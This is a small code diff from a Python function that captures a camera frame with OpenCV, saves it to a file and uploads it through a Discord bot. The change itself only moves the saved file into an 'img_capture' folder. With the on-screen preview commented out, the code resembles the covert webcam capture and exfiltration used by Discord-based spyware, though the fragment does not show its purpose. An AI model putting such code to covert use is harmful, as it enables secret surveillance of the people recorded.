@@ -13,7 +13,7 @@ def cam():
         
     if ret:
         # cv2.imshow("video", img)
-        file = "image.png"
+        file = "img_capture/image.png"
         cv2.imwrite(file, img)
         Bot_Discord.upload_file(file)
 
